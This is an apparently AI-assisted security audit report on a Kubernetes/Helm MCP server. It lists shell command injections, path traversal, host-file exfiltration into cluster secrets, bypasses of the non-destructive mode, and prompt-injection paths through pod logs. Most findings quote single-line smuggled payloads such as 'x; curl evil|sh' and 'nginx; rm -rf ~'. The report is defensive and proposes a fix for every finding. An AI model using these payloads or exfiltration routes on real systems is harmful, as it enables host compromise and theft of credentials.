# Agent & MCP security report

Scanned: `/tmp/blind/c07` · 2026-11-23T20:38:34+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 17 | 3 | 2 | 1 | 0 | 10 | 1 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **26** · agent/MCP code files: **16** · agent instruction files: **1**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M002 · CRITICAL · Helm tools build shell commands from tool arguments
`None:None` · ASI05 Unexpected Code Execution

name, chart, repo and namespace of install/upgrade/uninstall_helm_chart are pasted into a shell string run by execSync; repo='https://x; curl evil|sh' runs on the host. The scanner did not flag this file.
> `src/tools/helm-operations.ts:115` — `executeHelmCommand(`helm repo add ${repoName} ${params.repo}`);`
> `src/tools/helm-operations.ts:119` — `let command = `helm install ${params.name} ${params.chart} --namespace ${params.namespace} --create-namespace`;`
> `src/tools/helm-operations.ts:94` — `return execSync(command, {`

**Fix:** execFile('helm', ['install', name, chart, '--namespace', ns, ...]) with DNS-1123 validation of name/namespace and an https URL check for repo.

### M004 · CRITICAL · explain_resource / list_api_resources build shell commands from tool arguments
`None:None` · ASI05 Unexpected Code Execution

resource, apiVersion, apiGroup and verbs are concatenated into a shell string; these 'read-only' tools remain listed in non-destructive mode, so resource='pods; id' gives host code execution there too. Not flagged by the scanner.
> `src/tools/kubectl-operations.ts:95` — `command += ` ${params.resource}`;`
> `src/tools/kubectl-operations.ts:71` — `return execSync(command, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F002 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-apply.ts:93` · ASI05 Unexpected Code Execution

filename and namespace from the tool arguments are pasted into a shell string; namespace='default; id > /tmp/p' executes on the host.
> `src/tools/kubectl-apply.ts:75` — `command += ` -f ${input.filename}`;`
> `src/tools/kubectl-apply.ts:79` — `command += ` -n ${namespace}`;`
> `src/tools/kubectl-apply.ts:93` — `const result = execSync(command, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F009 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-create.ts:395` · ASI05 Unexpected Code Execution

name, image, namespace, fromLiteral, command, labels, annotations and output are concatenated into a shell string; image='nginx; rm -rf ~' runs on the host.
> `src/tools/kubectl-create.ts:324` — `command += ` deployment ${input.name} --image=${input.image}`;`
> `src/tools/kubectl-create.ts:395` — `const result = execSync(command, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F010 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-delete.ts:137` · ASI05 Unexpected Code Execution

resourceType, name, labelSelector, filename and namespace go into a shell string; name='x; curl evil|sh' executes on the host.
> `src/tools/kubectl-delete.ts:110` — `command += ` ${input.name}`;`
> `src/tools/kubectl-delete.ts:137` — `const result = execSync(command, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F011 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-describe.ts:67` · ASI05 Unexpected Code Execution

name/resourceType/namespace from tool args are pasted into a shell command; a 'read-only' describe call gives host command execution.
> `src/tools/kubectl-describe.ts:56` — `command += ` ${name}`;`
> `src/tools/kubectl-describe.ts:67` — `const result = execSync(command, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F001 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-generic.ts:116` · ASI05 Unexpected Code Execution

Every kubectl_generic argument (command, name, namespace, flags, args) is joined with spaces and run through a shell; args=['x; curl evil|sh'] runs arbitrary commands on the host with the user's kubeconfig. Also listed as 'destructive' but still callable (see M001).
> `src/tools/kubectl-generic.ts:109` — `cmdArgs.push(...input.args);`
> `src/tools/kubectl-generic.ts:116` — `const result = execSync(`kubectl ${command}`, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F012 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-get.ts:143` · ASI05 Unexpected Code Execution

name, namespace, labelSelector, fieldSelector and sortBy go into a shell string; labelSelector='a=b;id' runs commands. kubectl_get stays available in non-destructive mode.
> `src/tools/kubectl-get.ts:89` — `command += ` ${name}`;`
> `src/tools/kubectl-get.ts:143` — `const result = execSync(command, {`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F013 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-logs.ts:104` · ASI05 Unexpected Code Execution

namespace, name, container, since, sinceTime are interpolated into a shell command; name='p $(id)' executes.
> `src/tools/kubectl-logs.ts:92` — `baseCommand += ` logs ${name}`;`
> `src/tools/kubectl-logs.ts:104` — `const result = execSync(baseCommand, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F014 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-logs.ts:122` · ASI05 Unexpected Code Execution

cronjob path: namespace and name from tool args are pasted into a shell string.
> `src/tools/kubectl-logs.ts:120` — `const jobsCommand = `kubectl -n ${namespace} get jobs --selector=job-name=${name} -o jsonpath='{.items[*].metadata.name}'`;`
> `src/tools/kubectl-logs.ts:122` — `const jobs = execSync(jobsCommand, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } }).trim().split(' ');`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F015 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-logs.ts:178` · ASI05 Unexpected Code Execution

deployment path: namespace and name from tool args reach a shell command.
> `src/tools/kubectl-logs.ts:114` — `selectorCommand = `kubectl -n ${namespace} get deployment ${name} -o jsonpath='{.spec.selector.matchLabels}'`;`
> `src/tools/kubectl-logs.ts:178` — `const selectorJson = execSync(selectorCommand, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } }).trim();`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F016 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-logs.ts:267` · ASI05 Unexpected Code Execution

labelSelector and namespace from tool args go into a shell string.
> `src/tools/kubectl-logs.ts:210` — `return getLabelSelectorLogs(input.labelSelector, namespace, input);`
> `src/tools/kubectl-logs.ts:266` — `const podsCommand = `kubectl -n ${namespace} get pods --selector=${labelSelector} -o jsonpath='{.items[*].metadata.name}'`;`
> `src/tools/kubectl-logs.ts:267` — `const pods = execSync(podsCommand, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } }).trim().split(' ');`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F017 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-logs.ts:304` · ASI05 Unexpected Code Execution

container/since/sinceTime from tool args are appended to a shell string.
> `src/tools/kubectl-logs.ts:297` — `podCommand += ` -c ${input.container}`;`
> `src/tools/kubectl-logs.ts:304` — `const logs = execSync(podCommand, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F018 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-patch.ts:112` · ASI05 Unexpected Code Execution

resourceType, name, namespace and patchFile are interpolated into a shell command.
> `src/tools/kubectl-patch.ts:77` — `let command = `kubectl patch ${input.resourceType} ${input.name} -n ${namespace}`;`
> `src/tools/kubectl-patch.ts:112` — `const result = execSync(command, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F019 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-rollout.ts:97` · ASI05 Unexpected Code Execution

name/namespace/timeout (and subCommand/resourceType, whose enums are not enforced server-side) reach a shell string.
> `src/tools/kubectl-rollout.ts:72` — `let command = `kubectl rollout ${input.subCommand} ${input.resourceType}/${input.name} -n ${namespace}`;`
> `src/tools/kubectl-rollout.ts:97` — `const result = execSync(command, {`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F020 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-rollout.ts:112` · ASI05 Unexpected Code Execution

Same shell string as F019 on the non-watch path; timeout='1s;id' executes.
> `src/tools/kubectl-rollout.ts:86` — `command += ` --timeout=${input.timeout}`;`
> `src/tools/kubectl-rollout.ts:112` — `const result = execSync(command, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### F021 · CRITICAL · CMD-INJECTION
`src/tools/kubectl-scale.ts:52` · ASI05 Unexpected Code Execution

name, namespace, resourceType (and replicas, not type-checked server-side) are pasted into a shell command.
> `src/tools/kubectl-scale.ts:48` — `let command = `kubectl scale ${resourceType} ${input.name} --replicas=${input.replicas} --namespace=${namespace}`;`
> `src/tools/kubectl-scale.ts:52` — `const result = execSync(command, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });`

**Fix:** execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

### M001 · HIGH · Non-destructive mode only hides tools; destructive tools are still callable
`None:None` · 

ALLOW_ONLY_NON_DESTRUCTIVE_TOOLS only filters tools/list; the tools/call handler never checks it, so a client (or injected prompt) that names kubectl_delete, kubectl_generic, uninstall_helm_chart or cleanup directly still runs them.
> `src/index.ts:151` — `const tools = nonDestructiveTools`
> `src/index.ts:223` — `if (name === "kubectl_delete") {`
> `src/index.ts:309` — `if (name === "kubectl_generic") {`

**Fix:** In the CallTool handler, reject any name in destructiveTools when nonDestructiveTools is true (and consider also blocking apply/create/patch/scale/exec_in_pod in that mode).

### M003 · HIGH · Helm values file written to a path built from the release name
`None:None` · ASI02 Tool Misuse and Exploitation

name comes from the tool arguments, so name='../../home/u/.config/autostart/x' writes attacker-chosen YAML content to any path ending in -values.yaml (relative to the server's cwd), overwriting existing files.
> `src/tools/helm-operations.ts:105` — `const filename = `${name}-values.yaml`;`
> `src/tools/helm-operations.ts:106` — `writeFileSync(filename, yaml.stringify(values));`

**Fix:** Write values to fs.mkdtempSync(os.tmpdir()) with a fixed filename, and validate name with ^[a-z0-9]([-a-z0-9]*[a-z0-9])?$.

### M006 · HIGH · Tools read arbitrary host files into the cluster (--from-file / -f / --patch-file)
`None:None` · ASI02 Tool Misuse and Exploitation

Even without shell metacharacters, kubectl_create secret/configmap with fromFile=['/home/u/.ssh/id_rsa'] (or ~/.kube/config, cloud credentials) copies any file the server can read into a cluster object that kubectl_get can then return, so a prompt injection can exfiltrate host secrets; filename/patchFile also accept any path or URL.
> `src/tools/kubectl-create.ts:266` — `input.fromFile.forEach(file => {`
> `src/tools/kubectl-create.ts:267` — `command += ` --from-file=${file}`;`

**Fix:** Drop fromFile/filename/patchFile from the tool interface or restrict them to an allowlisted directory after realpath containment checks.

### M005 · MEDIUM · port_forward splits a command string built from tool arguments
`None:None` · ASI02 Tool Misuse and Exploitation

No shell, but namespace/resourceName containing spaces add extra kubectl options, e.g. namespace='default --address 0.0.0.0' exposes the forwarded cluster port on all host interfaces.
> `src/tools/port_forward.ts:84` — `command += ` -n ${input.namespace}`;`
> `src/tools/port_forward.ts:10` — `const [cmd, ...args] = command.split(" ");`

**Fix:** Build the args array directly: spawn('kubectl', ['port-forward','-n',ns,`${type}/${name}`,`${lp}:${tp}`]) after validating names and that ports are integers.

### M008 · MEDIUM · exec_in_pod runs arbitrary shell commands in any pod without approval
`None:None` · ASI02 Tool Misuse / ASI05 Unexpected Code Execution

By design the model can run any command in any pod/namespace the kubeconfig allows (reading mounted service-account tokens and secrets); it is not treated as destructive and is not hidden in non-destructive mode.
> `src/tools/exec_in_pod.ts:86` — `commandArr = [shell, "-c", input.command];`
> `src/tools/exec_in_pod.ts:144` — `exec.exec(`

**Fix:** Add exec_in_pod to destructiveTools, require human confirmation, and allow only configured namespaces.

### M009 · LOW · Pod logs and exec output returned raw to the model
`None:None` · 

Logs and command output are written by workloads (often from external users) and go straight into the model context; injected text there can drive the command-injection tools above.
> `src/tools/kubectl-logs.ts:105` — `return formatLogOutput(name, result);`
> `src/tools/exec_in_pod.ts:188` — `text: stdout,`

**Fix:** Wrap returned logs as clearly marked untrusted data and truncate; combined with fixing the shell injections.

## Dismissed as false alarms

- F003 CMD-INJECTION `src/tools/kubectl-context.ts:69` — The command string is a constant (only fixed literals are appended); no tool argument reaches this execSync.
- F004 CMD-INJECTION `src/tools/kubectl-context.ts:105` — The command string is a constant (only fixed literals are appended); no tool argument reaches this execSync.
- F005 CMD-INJECTION `src/tools/kubectl-context.ts:114` — The command string is a constant (only fixed literals are appended); no tool argument reaches this execSync.
- F006 CMD-INJECTION `src/tools/kubectl-context.ts:118` — The command string is a constant (only fixed literals are appended); no tool argument reaches this execSync.
- F007 CMD-INJECTION `src/tools/kubectl-context.ts:204` — The command string is a constant (only fixed literals are appended); no tool argument reaches this execSync.
- F008 CMD-INJECTION `src/tools/kubectl-context.ts:228` — The context name must exactly match a context already listed by kubectl from the operator's kubeconfig before it is used, so an attacker cannot inject shell text (it is still worth moving to execFile).
- F022 PATH-TRAVERSAL `src/tools/kubectl-apply.ts:72` — Only the file content comes from the tool; the path is built from os.tmpdir() and a timestamp, so the caller cannot choose where it is written. (Predictable temp names are a minor hardening issue; the real problems in this tool are the shell injection findings.)
- F023 PATH-TRAVERSAL `src/tools/kubectl-create.ts:217` — Only the file content comes from the tool; the path is built from os.tmpdir() and a timestamp, so the caller cannot choose where it is written. (Predictable temp names are a minor hardening issue; the real problems in this tool are the shell injection findings.)
- F024 PATH-TRAVERSAL `src/tools/kubectl-delete.ts:101` — Only the file content comes from the tool; the path is built from os.tmpdir() and a timestamp, so the caller cannot choose where it is written. (Predictable temp names are a minor hardening issue; the real problems in this tool are the shell injection findings.)
- F025 PATH-TRAVERSAL `src/tools/kubectl-patch.ts:99` — Only the file content comes from the tool; the path is built from os.tmpdir() and a timestamp, so the caller cannot choose where it is written. (Predictable temp names are a minor hardening issue; the real problems in this tool are the shell injection findings.)

## Needs information from you

- M007 NETWORK-EXPOSURE `None:None` — When ENABLE_UNSAFE_SSE_TRANSPORT is set, anyone who can reach the port (HOST may be set to 0.0.0.0; a browser page via DNS rebinding even on localhost) gets all tools, including the command injections above. Depends on how it is deployed.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
